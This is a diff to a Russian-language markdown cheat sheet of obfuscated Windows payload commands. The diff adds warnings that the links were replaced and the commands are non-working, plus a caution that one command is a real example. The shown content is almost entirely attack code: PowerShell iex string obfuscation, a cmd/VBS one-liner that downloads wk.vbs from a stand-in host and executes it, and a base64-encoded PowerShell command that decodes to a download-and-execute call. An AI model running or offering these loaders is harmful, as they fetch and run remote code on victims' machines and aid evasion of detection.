@@ -1,3 +1,6 @@
+> [!WARNING]
+> Команды не рабочие все ссылки заменены, но это не отменяет перепроверку и аккуратность использования
+
 ## Простая обфускация с использованием строк
 ```cmd
 $e=([char]0x68+[char]0x65+[char]0x6C+[char]0x6C+[char]0x6F);iex $e
@@ -35,7 +38,10 @@ cmd /c echo Set h=CreateObject("WinHttp.WinHttpRequest.5.1"):h.Open "GET","http:
 cmd /c echo Set h=CreateObject("WinHttp.WinHttpRequest.5.1"):h.Open "GET","http://example.com:5506/wk.vbs",0:h.Send:Execute h.ResponseText > "%temp%wk.vbs" && "%temp%wk.vbs"
 ```
 ## Обфусцированная PowerShell-полезная нагрузка с загрузкой и выполнением
-Выполняйте команду только в изолированной среде, она является реальным примером
+
+> [!CAUTION]
+> Выполняйте команду только в изолированной среде, она является реальным примером
+
 ```powershell
 powershell -wind mi -Enc JwBhACcALAAnAHoAJwB8ACUAewAuACcAaQBlAHgAJwAoACgAKAAiAHcAaQB3AHIAbQAgADcANgAzADYAMwA4ADEAOQAxAC8AbABvAG0ALwAkAF8ALgBnAHcAaQBmAHwAdwBpAHcAZQB3AHgAIgApAC4AcgBlAHAAbABhAGMAZQAoACcAdwAnACwAJwAnACkAKQApAH0A
 ```
